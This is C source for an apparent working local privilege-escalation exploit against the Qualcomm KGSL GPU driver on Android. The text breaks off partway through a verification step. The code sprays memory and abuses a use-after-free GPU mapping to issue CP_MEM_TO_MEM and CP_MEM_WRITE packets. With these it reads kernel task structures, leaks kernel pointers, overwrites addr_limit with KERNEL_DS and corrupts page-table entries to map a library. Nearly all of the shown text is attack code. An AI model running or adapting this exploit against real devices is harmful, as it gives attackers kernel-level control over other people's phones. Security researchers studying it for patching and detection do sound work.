#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#define MARKER_NAME "KETO0422"  // name
#define MAX_FOUND_PAGES 1
#define SECOND_CHILD_START 0x900
#define FOUND_PID 0x300
#define SET_TASKS 0x200
#define SEND_ADDR 3
#define GOT_ADDR 4
#define CALL_LOGLINE 0xff0
#define CUR_PID 0xfa0
#define MMAP_CORRUPT_CNT 0x9f8
#define EX_OVER 0xffc
#define TASK_SPRAY_CLEAR 0x901
#define TARGET_PIDPID 0x40
char * gbuf;
int fd;
int fd2;
int fd_lib;
int fd_shellcode;
struct stat st;
char check_flag[100]={0,};
unsigned long long gb_target_addr;
uint64_t selinux_enforcing;
static void flush_icache(void *addr, size_t len)
{
    __builtin___clear_cache((char *)addr, (char *)addr + len);
    __sync_synchronize();
}
uint8_t sig_num[] = {1,3,5,7,9};
// KGSL UAPI
#define KGSL_IOC_TYPE 0x09
#define FINDING 1
#define SPRAY_COUNT 4000
#define SPRAY_COUNT_STEP 2000
#define SPRAY_COUNT_MAX 20000
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002U
typedef struct {
    pid_t pid;
    int   do_action;
} spray_slot_t;

static spray_slot_t *spray_ctrl;  
static int spray_count = SPRAY_COUNT;
struct kgsl_gpuobj_alloc {
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapsize;          // OUT
    unsigned int id;            // OUT
    unsigned int metadata_len;
    uint64_t metadata;
};

struct kgsl_gpuobj_free {
    uint64_t flags;
    uint64_t priv;
    unsigned int id;
    unsigned int type;
    unsigned int len;
};

struct kgsl_map_user_mem {
    int fd;
    unsigned long gpuaddr;
    size_t len;
    size_t offset;
    unsigned long hostptr;
    unsigned int memtype;
    unsigned int flags;
};

#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE  _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)

#define DEV_PATH "/dev/kgsl-3d0"
#define PAGE_SIZE 4096

#define UAF_START      0x00000007001ff000ULL
#define UAF_SIZE       0x0000000010004000ULL

#define OVERLAP_START  0x00000007001fe000ULL
#define OVERLAP_SIZE   0x0000000000007000ULL

#define PLACEH_START   0x0000000710204000ULL
#define PLACEH_SIZE    0x0000000000010000ULL

#define BOGUS_START    0x0000000700204000ULL
#define WRAP_SIZE      0xffffffffffefd000ULL

typedef struct {
    int fd;
    volatile int ready;
    volatile int bogus_started;
    volatile int result;
    volatile int saved_errno;  
} race_state_t;


#define CP_NOP        0x10
#define CP_MEM_WRITE  0x3D
#define CP_MEM_TO_MEM 0x73

#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_PREAMBLE      0x00000010
#define KGSL_CMDLIST_IB            0x00000001U
#define KGSL_TIMESTAMP_RETIRED     0x00000002

struct kgsl_drawctxt_create { 
    unsigned flags, drawctxt_id; 
};

struct kgsl_command_object { 
    uint64_t offset, gpuaddr, size; 
    unsigned flags, id; 
};

struct kgsl_gpu_command {
    uint64_t flags, cmdlist; 
    unsigned cmdsize, numcmds; 
    uint64_t objlist; 
    unsigned objsize, numobjs;
    uint64_t synclist; 
    unsigned syncsize, numsyncs, context_id, timestamp;
};

struct kgsl_cmdstream_readtimestamp_ctxtid { 
    unsigned context_id, type, timestamp; 
};

struct kgsl_gpuobj_info { 
    uint64_t gpuaddr, flags, size, va_len, va_addr; 
    unsigned id; 
};

#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_GPUOBJ_INFO     _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
#define IOCTL_KGSL_GPU_COMMAND     _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID \
    _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
{
    return (0x9669u >> (0xFu & (val ^ (val >> 4) ^ (val >> 8) ^ (val >> 12) ^
                                (val >> 16) ^ (val >> 20) ^ (val >> 24) ^ (val >> 28)))) & 1u;
}
#define MMAP_SPRAY_COUNT 12000
#define MMAP_SPRAY_STRIDE 0x200000ULL
#define MMAP_SPRAY_BASE 0x0000000200000000ULL

#define PAGE_SHIFT     12
#define PAGE_MASK      (~(PAGE_SIZE - 1))
#define PMD_SHIFT      21
#define PGDIR_SHIFT    30
#define PTRS_PER_PTE   512
#define PTRS_PER_PMD   512
#define PTRS_PER_PGD   512
#define PHYS_MASK      ((1ULL << 48) - 1)   // 48-bit PA 

typedef struct { uint64_t pgd; } pgd_t;
typedef struct { uint64_t pmd; } pmd_t;
typedef struct { uint64_t pte; } pte_t;

struct mm_struct {
    struct vm_area_struct *mmap;
    pgd_t *pgd;
};

#define pgd_index(addr) (((addr) >> PGDIR_SHIFT) & (PTRS_PER_PGD - 1))
#define pmd_index(addr) (((addr) >> PMD_SHIFT) & (PTRS_PER_PMD - 1))
#define pte_index(addr) (((addr) >> PAGE_SHIFT) & (PTRS_PER_PTE - 1))

#define pgd_val(x) ((x).pgd)
#define pmd_val(x) ((x).pmd)
#define pte_val(x) ((x).pte)

#define PTE_SAVE_BASE 0xf00


static int wait_timestamp(int fd, unsigned ctx_id, unsigned target);
static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt);
static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi);

static void recover_origin(int fd){
    /* recover corrupted PTE. named "PTE0", "PTE1" were weired but I'm too lazy  */
    uint64_t patched_va[64] = {0};
    uint64_t saved_pte0[64] = {0};
    size_t patched_cnt = 0;
    uint32_t rb_count = *(uint32_t *)(gbuf + 0xb00);
    for (uint32_t i = 0; i < rb_count && patched_cnt < sizeof(patched_va)/sizeof(patched_va[0]); i++) {
        patched_va[patched_cnt] = *(uint64_t *)(gbuf + 0xb08 + i * 24);
        saved_pte0[patched_cnt] = *(uint64_t *)(gbuf + PTE_SAVE_BASE + i * 8);
        patched_cnt++;
    }

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
    };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
        perror("recover_origin: ctx create");
        return;
    }
    unsigned ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size  = PAGE_SIZE * 2,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
    };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
        perror("recover_origin: ib alloc");
        return;
    }
    unsigned ib_id = ib_alloc.id;
    void *ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED) {
        perror("recover_origin: ib mmap");
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }

    struct kgsl_gpuobj_info info = { .id = ib_id };
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    uint64_t ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size  = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
    };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) {
        perror("recover_origin: dst alloc");
        munmap(ib_vma, ib_alloc.mmapsize);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }
    unsigned dst_id = dst_alloc.id;
    void *dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED) {
        perror("recover_origin: dst mmap");
        munmap(ib_vma, ib_alloc.mmapsize);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = ib_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        fr.id = dst_id;
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        return;
    }
    struct kgsl_gpuobj_info dst_info = { .id = dst_id };
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &dst_info);
    uint64_t dst_gpu = dst_info.gpuaddr;

    for (size_t i = 0; i < patched_cnt; i++) {
        uint64_t base = patched_va[i];
        if (!base) {
            fprintf(stderr,
                    "recover_origin: empty VA entry at index %zu\n",
                    i);
            continue;
        }
        uint64_t orig_pte0 = saved_pte0[i];
        if (!orig_pte0) {
            fprintf(stderr,
                    "recover_origin: no saved PTE0 for VA 0x%llx\n",
                    (unsigned long long)base);
            continue;
        }

        uint32_t *cmd = (uint32_t *)ib_vma;

        memset(ib_vma, 0, ib_alloc.mmapsize);
        int dw = 0;
        uint32_t d_lo, d_hi, s_lo, s_hi;
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
        split64(dst_gpu, &d_lo, &d_hi);
        split64(base + 0x8, &s_lo, &s_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0;
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = s_lo;
        cmd[dw++] = s_hi;
        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        size_t bytes = (size_t)dw * 4;
        msync(ib_vma, bytes, MS_SYNC);

        struct kgsl_command_object obj = {
            .gpuaddr = ib_gpu,
            .size    = bytes,
            .flags   = KGSL_CMDLIST_IB,
            .id      = ib_id
        };

        struct kgsl_gpu_command c = {0};
        c.cmdlist    = (uint64_t)(uintptr_t)&obj;
        c.cmdsize    = sizeof(obj);
        c.numcmds    = 1;
        c.context_id = ctx_id;

        uint64_t pte1 = 0;
        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
            wait_timestamp(fd, ctx_id, c.timestamp) != 0) {
            fprintf(stderr,
                    "recover_origin: PTE1 read failed for VA 0x%llx\n",
                    (unsigned long long)base);
            continue;
        } else {
            msync(dst_vma, 8, MS_SYNC | MS_INVALIDATE);
            pte1 = *(uint64_t *)dst_vma;
        }

        memset(ib_vma, 0, ib_alloc.mmapsize);
        dw = 0;

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        split64(base+8, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = (uint32_t)(orig_pte0 & 0xffffffffu);

        split64(base + 12, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = (uint32_t)(orig_pte0 >> 32);

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        bytes = (size_t)dw * 4;
        msync(ib_vma, bytes, MS_SYNC);

        obj.size = bytes;
        memset(&c, 0, sizeof(c));
        c.cmdlist    = (uint64_t)(uintptr_t)&obj;
        c.cmdsize    = sizeof(obj);
        c.numcmds    = 1;
        c.context_id = ctx_id;

        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
            wait_timestamp(fd, ctx_id, c.timestamp) != 0) {
            fprintf(stderr,
                    "recover_origin: GPU restore failed for VA 0x%llx\n",
                    (unsigned long long)base);
        } else {
            fprintf(stderr,
                    "recover_origin: restored PTE0 at VA 0x%llx (PTE1=0x%016llx, PTE0=0x%016llx)\n",
                    (unsigned long long)base,
                    (unsigned long long)pte1,
                    (unsigned long long)orig_pte0);
        }
    }

    munmap(ib_vma, ib_alloc.mmapsize);
    struct kgsl_gpuobj_free fr = {0};
    fr.id = ib_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    munmap(dst_vma, dst_alloc.mmapsize);
    struct kgsl_gpuobj_free fr_dst = {0};
    fr_dst.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr_dst);
}


static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt)
{
    return (7u << 28)
         | ((cnt & 0x3FFFu) << 0)
         | (pm4_calc_odd_parity_bit(cnt) << 15)
         | ((opcode & 0x7Fu) << 16)
         | (pm4_calc_odd_parity_bit(opcode) << 23);
}

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi)
{ 
    *lo = (uint32_t)addr; 
    *hi = (uint32_t)(addr >> 32); 
}

static int mmap_spray_done;
static void mmap_spray(void)
{
    
	fprintf(stderr, "\n[13] mmap-spraying user VA space\n");
	mmap_spray_done = 0;
	for (int i = 0; i < MMAP_SPRAY_COUNT; i++) {
		uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
		void *p;
        for(int j = 0 ; j < 5; j++){
            p = mmap(addr + PAGE_SIZE * (uint64_t)sig_num[j] , PAGE_SIZE,
		         PROT_READ | PROT_WRITE,
		         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
		         -1, 0);
            *(volatile uint8_t *)p = sig_num[j];                 
		    if ((uint64_t)p != (uint64_t)addr + PAGE_SIZE * (uint64_t)sig_num[j]) { fprintf(stderr,"mmap_spray"); break; }
            
        }
		
		
		mmap_spray_done++;
	}
}




static void mmap_spray_free(void)
{
	for (int i = 0; i < MMAP_SPRAY_COUNT; i++) {
		uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        if (1){
            for(int j=0;j<5;j++){
                munmap(addr + PAGE_SIZE * (uint64_t)sig_num[j],0x1000);
            }
        }
        else {
            fprintf(stderr,"\nfind that addr\n");
        }
	}
}
static void mmap_check(void)
{
    uint64_t * check_addr = (uint64_t *)&gbuf[0xa00];
    int cnt = 0;
    uint32_t *corrupt_cnt = (uint32_t *)(gbuf + MMAP_CORRUPT_CNT);
	fprintf(stderr, "\n[14] mmap-checking user VA space\n");
	*corrupt_cnt = 0;
    for (int i = 0; i < MMAP_SPRAY_COUNT; i++) {
		uint8_t *addr = (uint8_t *)(MMAP_SPRAY_BASE + i * MMAP_SPRAY_STRIDE);
        uint8_t * pp =addr + PAGE_SIZE * (uint64_t)sig_num[0];
		if (*(volatile uint8_t *)pp != sig_num[0]){ // PFN write success
            fprintf(stderr,"PFN corrupted!!\n");
            gb_target_addr = (uint64_t)addr;
            // No need to pad the hole..
            for (int k = 0; k < 10; k += 2) { 
                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
                
                void *filled = mmap(hole_addr, PAGE_SIZE, 
                                    PROT_READ | PROT_WRITE, 
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 
                                    -1, 0);
                                    
                if (filled != MAP_FAILED) {
                    *(volatile uint8_t *)filled = 0xCC; 
                }
                else{
                    fprintf(stderr, "abc %d\n",k);
                }
            }
            for (int k = 10; k < 16; k += 1) { 
                void *hole_addr = (void *)(addr + k * PAGE_SIZE);
                
                
                void *filled = mmap(hole_addr, PAGE_SIZE, 
                                    PROT_READ | PROT_WRITE, 
                                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 
                                    -1, 0);
                                    
                if (filled != MAP_FAILED) {
                    *(volatile uint8_t *)filled = 0xCC; 
                }
                else{
                    fprintf(stderr, "1234!@#$ %d\n",k);
                }
            }
            

            void *base = (void *)(addr + 0x10 * PAGE_SIZE); // pte offset = 0x130
            size_t len = 0x3e000;

            void *lib = mmap(base, len,
                 PROT_READ | PROT_EXEC,
                 MAP_PRIVATE | MAP_FIXED | MAP_POPULATE,
                 fd_lib, 0);



            if (lib == MAP_FAILED) {
                fprintf(stderr, "mmap libbase error");
                perror("mmap libbase");
                
                exit(1);
            } else 
            {

                fprintf(stderr, "success mmap libbase : va: %p\n", lib);

                volatile uint8_t *p = (volatile uint8_t *)lib;
                for (size_t off = 0; off < 0x3e000; off += PAGE_SIZE) {
                    volatile uint8_t dummy = p[off]; // touch
                    (void)dummy; // prevent opt
                }
                *(uint64_t *)&gbuf[0x400] = (uint64_t)lib;
            }
        }

        else {
            //munmap(addr,2*PAGE_SIZE); junk
        }
	}
	//*corrupt_cnt = cnt;
}


static int wait_timestamp(int fd, unsigned ctx_id, unsigned target)
{
    struct kgsl_cmdstream_readtimestamp_ctxtid r = {0};
    r.context_id = ctx_id; 
    r.type = KGSL_TIMESTAMP_RETIRED;
    
    for (unsigned spins=0; spins<100000; ++spins) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) 
            return -1;
        if (r.timestamp >= target) 
            return 0;
        usleep(100); // from 150
    }
    return -2;
}

struct nonzero_page {
    uint64_t va;
    uint32_t data[1024];
    int non_zero_count;
};


#define USER_DS   0x0000007fffffffffULL
#define KERNEL_DS 0xffffffffffffffffULL

static int scan_uaf_for_nonzero_multi(int fd,
                                      struct nonzero_page *found_pages,
                                      int *num_found)
{
    unsigned int ctx_id = 0, ib_id = 0, dst_id = 0;
    uint64_t ib_gpu = 0, dst_gpu = 0;
    void *ib_vma = NULL, *dst_vma = NULL;
    int found = 0;
    char only_once =  0;
    *num_found = 0;

    fprintf(stderr, "\n[+] Scanning UAF region for non-zero pages\n");
    fprintf(stderr, "    Region: 0x%llx ~ 0x%llx (256MB)\n",
            (unsigned long long)UAF_START,
            (unsigned long long)(UAF_START + UAF_SIZE));
    fflush(stderr);

    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
    };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
        fprintf(stderr, "    [!] Failed to create GPU context\n");
        fflush(stderr);
        return 0;
    }
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc ib_alloc = {
        .size  = PAGE_SIZE * 8,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
    };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
        goto cleanup;
    }
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
    if (ib_vma == MAP_FAILED)
        goto cleanup;

    struct kgsl_gpuobj_info info = { .id = ib_id };
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    struct kgsl_gpuobj_alloc dst_alloc = {
        .size  = PAGE_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
    };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) {
        goto cleanup;
    }
    dst_id = dst_alloc.id;
    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
    if (dst_vma == MAP_FAILED)
        goto cleanup;

    info.id = dst_id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    fprintf(stderr, "    [+] Buffers ready\n");
    fprintf(stderr, "    [*] Scanning... (. = 100 pages)\n");
    fflush(stderr);

    uint64_t user_ds   = USER_DS;
    uint64_t kernel_ds = KERNEL_DS;
    uint32_t uds_lo = (uint32_t)(user_ds & 0xffffffffu);
    uint32_t uds_hi = (uint32_t)(user_ds >> 32);
    uint32_t kds_lo = (uint32_t)(kernel_ds & 0xffffffffu);
    uint32_t kds_hi = (uint32_t)(kernel_ds >> 32);

    uint64_t start_va   = UAF_START;
    uint64_t end_va     = UAF_START + UAF_SIZE;
    uint64_t current_va = start_va;
    int pages_scanned   = 0;
    int non_zero_pages  = 0;
    int no_candidate_run = 0;

    while (current_va < end_va) {
        // CP_MEM_TO_MEM 
        uint32_t *cmd = (uint32_t *)ib_vma;
        memset(ib_vma, 0, ib_alloc.mmapsize);
        memset(dst_vma, 0, dst_alloc.mmapsize);
        int dw = 0;

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        for (int i = 0; i < 1024; i++) {
            uint32_t d_lo, d_hi, s_lo, s_hi;
            split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
            split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);

            cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0x00000000;
            cmd[dw++] = d_lo;
            cmd[dw++] = d_hi;
            cmd[dw++] = s_lo;
            cmd[dw++] = s_hi;
        }

        cmd[dw++] = cp_type7_packet(CP_NOP, 0);

        size_t ib_bytes = (size_t)dw * 4;
        msync(ib_vma, ib_bytes, MS_SYNC);

        struct kgsl_command_object cmd_obj = {
            .gpuaddr = ib_gpu,
            .size    = ib_bytes,
            .flags   = KGSL_CMDLIST_IB,
            .id      = ib_id
        };

        struct kgsl_gpu_command gpu_cmd = {0};
        gpu_cmd.cmdlist    = (uint64_t)(uintptr_t)&cmd_obj;
        gpu_cmd.cmdsize    = sizeof(cmd_obj);
        gpu_cmd.numcmds    = 1;
        gpu_cmd.context_id = ctx_id;

        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0) {
            fprintf(stderr, "\n      [!] GPU command failed\n");
            fflush(stderr);
            break;
        }

        if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0) {
            fprintf(stderr, "\n      [!] GPU timeout\n");
            fflush(stderr);
            break;
        }

        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);

        uint32_t *data = (uint32_t *)dst_vma;
        uint8_t  *bytes = (uint8_t *)dst_vma;
        int non_zero = 0;
        for (int i = 0; i < 1024; i++) {
            if (data[i] != 0)
                non_zero++;
        }

        pages_scanned++;

        if (pages_scanned % 100 == 0) {
            fprintf(stderr, ".");
            fflush(stderr);
        }

        if (pages_scanned % 1000 == 0) {
            fprintf(stderr,
                    "\n      Progress: %d pages (%.1f%%), Found(>=300): %d\n",
                    pages_scanned,
                    (pages_scanned * 100.0) / 65535.0,
                    non_zero_pages);
            fflush(stderr);
        }

        if (non_zero < 350 || non_zero > 390) {
            no_candidate_run++;
            if (no_candidate_run >= 9000) {
                fprintf(stderr,
                        "\n      [!] No candidate pages in last %d pages, aborting scan\n",
                        no_candidate_run);
                fflush(stderr);
                break;
            }
        } else {
            no_candidate_run = 0;
        }

        if (non_zero >= 350 && non_zero <= 390) {
            fprintf(stderr,
                    "\n      [%d] Found at VA 0x%llx (page %d, non-zero: %d/1024)\n",
                    non_zero_pages + 1,
                    (unsigned long long)current_va,
                    pages_scanned,
                    non_zero);
            fflush(stderr);

            // 1) Find KETO0422 pattern 
            pid_t comm_pid = -1;
            int comm_off = -1;
            for (int off = 0; off < 4096 - 8; off++) {
                if (memcmp(bytes + off, "KETO0422", 8) == 0) {
                    fprintf(stderr,
                            "        [+] Found KETO0422 at offset 0x%03x\n", off);
                    fprintf(stderr,
                            "            Comm: %.16s\n", bytes + off);
                    comm_off = off;
                    char numbuf[6] = {0};
                    memcpy(numbuf,bytes+off+8,5);
                    comm_pid = (pid_t)atoi(numbuf);
                    fprintf(stderr, "            Parsed PID: %d\n", comm_pid);
                    break;

                }
            }

            // 2) Find USER_DS value (FFFFFFFF 0000007F)
            int userds_off = -1;
            for (int i = 0; i < 1023; i++) {
                if (data[i] == uds_lo && data[i + 1] == uds_hi) {
                    int off = i * 4;
                    uint64_t val = ((uint64_t)uds_hi << 32) | uds_lo;
                    fprintf(stderr,
                            "        [+] Found USER_DS at offset 0x%03x\n", off);
                    fprintf(stderr,
                            "            [0x%03x] %08X %08X\n",
                            off, data[i], data[i + 1]);
                    fprintf(stderr,
                            "            Value: 0x%016llx\n",
                            (unsigned long long)val);
                    userds_off = off;
                    break;
                }
            }
            

            //* 3) Dump and Store
            if (userds_off >= 0 && only_once < 1 &&
                userds_off == 0x40 && comm_off == 0x860) {
                only_once++;
                uint64_t page_va = current_va;
                current_va = end_va; // Actually, only once
                fprintf(stderr,
                        "        [DUMP BEFORE PATCH] VA 0x%llx, USER_DS off=0x%03x\n",
                        (unsigned long long)page_va, userds_off);
                {
                    uint64_t ptr_val = *(uint64_t *)(bytes + 0x850);
                    *(uint64_t *)&gbuf[0x10] = ptr_val;
                    fprintf(stderr,
                            "        [*] Saved 0x850 pointer 0x%016llx into gbuf+0x10\n",
                            (unsigned long long)ptr_val);
                    ptr_val = (*(uint64_t *)(bytes + 0x888)) -0x2BB8CF8;
                    *(uint64_t *)&gbuf[0x20] = ptr_val;
                    fprintf(stderr,
                            "        [*] Saved 0x888 pointer 0x%016llx into gbuf+0x20\n",
                            (unsigned long long)ptr_val);
                    ptr_val = *(uint64_t *)(bytes + 0x5a8);
                    if (ptr_val > 0)
                    {
                        *(uint64_t *)&gbuf[0x30] = ptr_val;
                        fprintf(stderr,
                                "        [*] Saved 0x5a8 pointer 0x%016llx into gbuf+0x30\n",
                                (unsigned long long)ptr_val);
                    }
                    else{
                        fprintf(stderr,"wrOng\n");
                        _exit(1);
                    }
                    
                }
                
                for (int off = 0; off < 4096; off += 0x20) {
                    int idx = off / 4;
                    fprintf(stderr, "          [0x%03x] %08X %08X %08X %08X %08X %08X %08X %08X\n",
                            off,
                            data[idx + 0], data[idx + 1], data[idx + 2], data[idx + 3],
                            data[idx + 4], data[idx + 5], data[idx + 6], data[idx + 7]);
                }
                            
                fflush(stderr);

 
                uint64_t target_addr = page_va + (uint64_t)userds_off;
                fprintf(stderr,
                        "        [*] Patching addr_limit at VA 0x%llx to KERNEL_DS\n",
                        (unsigned long long)target_addr);

                memset(ib_vma, 0, ib_alloc.mmapsize);
                dw = 0;

                uint32_t *wcmd = (uint32_t *)ib_vma;

                for (int i = 0; i < 4; i++)
                    wcmd[dw++] = cp_type7_packet(CP_NOP, 0);

                uint32_t t_lo, t_hi;

                split64(target_addr, &t_lo, &t_hi);
                wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                wcmd[dw++] = t_lo;
                wcmd[dw++] = t_hi;
                wcmd[dw++] = kds_lo;

                split64(target_addr + 4, &t_lo, &t_hi);
                wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                wcmd[dw++] = t_lo;
                wcmd[dw++] = t_hi;
                wcmd[dw++] = kds_hi;

                for (int i = 0; i < 4; i++)
                    wcmd[dw++] = cp_type7_packet(CP_NOP, 0);

                size_t patch_ib_bytes = (size_t)dw * 4;
                msync(ib_vma, patch_ib_bytes, MS_SYNC);

                struct kgsl_command_object patch_obj = {
                    .gpuaddr = ib_gpu,
                    .size    = patch_ib_bytes,
                    .flags   = KGSL_CMDLIST_IB,
                    .id      = ib_id
                };

                struct kgsl_gpu_command patch_cmd = {0};
                patch_cmd.cmdlist    = (uint64_t)(uintptr_t)&patch_obj;
                patch_cmd.cmdsize    = sizeof(patch_obj);
                patch_cmd.numcmds    = 1;
                patch_cmd.context_id = ctx_id;

                if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &patch_cmd) != 0) {
                    fprintf(stderr,
                            "        [!] GPU patch command failed: %s\n",
                            strerror(errno));
                } else if (wait_timestamp(fd, ctx_id, patch_cmd.timestamp) != 0) {
                    fprintf(stderr, "        [!] GPU patch timeout\n");
                } else {
                    fprintf(stderr,
                            "        [+] addr_limit patched to KERNEL_DS (0x%016llx)\n",
                            (unsigned long long)kernel_ds);

                    memset(dst_vma, 0, dst_alloc.mmapsize);

                    uint32_t *vcmd = (uint32_t *)ib_vma;
                    uint32_t d_lo, d_hi, s_lo, s_hi;

                    memset(ib_vma, 0, ib_alloc.mmapsize);
                    dw = 0;
                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                    split64(dst_gpu, &d_lo, &d_hi);
                    split64(target_addr, &s_lo, &s_hi);
                    vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                    vcmd[dw++] = 0x00000000;
                    vcmd[dw++] = d_lo;
                    vcmd[dw++] = d_hi;
                    vcmd[dw++] = s_lo;
                    vcmd[dw++] = s_hi;
                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);

                    size_t verify_ib_bytes = (size_t)dw * 4;
                    msync(ib_vma, verify_ib_bytes, MS_SYNC);

                    struct kgsl_command_object verify_obj = {
                        .gpuaddr = ib_gpu,
                        .size    = verify_ib_bytes,
                        .flags   = KGSL_CMDLIST_IB,
                        .id      = ib_id
                    };

                    struct kgsl_gpu_command verify_cmd = {0};
                    verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
                    verify_cmd.cmdsize    = sizeof(verify_obj);
                    verify_cmd.numcmds    = 1;
                    verify_cmd.context_id = ctx_id;

